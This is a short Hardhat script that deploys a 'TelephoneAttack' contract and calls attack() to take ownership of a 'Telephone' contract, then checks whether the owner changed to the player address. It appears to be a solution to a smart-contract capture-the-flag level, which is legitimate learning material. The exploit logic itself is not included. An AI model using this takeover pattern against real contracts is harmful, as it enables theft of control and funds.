const { ethers } = require("hardhat");

const CONTRACT_ADDRESS = "0xF380bC8b4e595dECa3A55A4C98A6C4fA1c96f537";
const PLAYER_ADDRESS = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);
  const attackerFactory = await ethers.getContractFactory(
    `TelephoneAttack`,
    signer
  );
  const telephone = await ethers.getContractAt(
    `Telephone`,
    CONTRACT_ADDRESS,
    signer
  );

  const attacker = await attackerFactory.deploy();
  console.log(`attacker address ${attacker.address}`);
  // Send the transaction
  try {
    const tx = await attacker.attack();
    await tx.wait();

    if (!tx) {
      return;
    }

    if ((await telephone.owner()) == PLAYER_ADDRESS) {
      console.log("changed..................");
    }
  } catch (error) {
    console.error("Error while sending transaction:", error);
    return false;
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
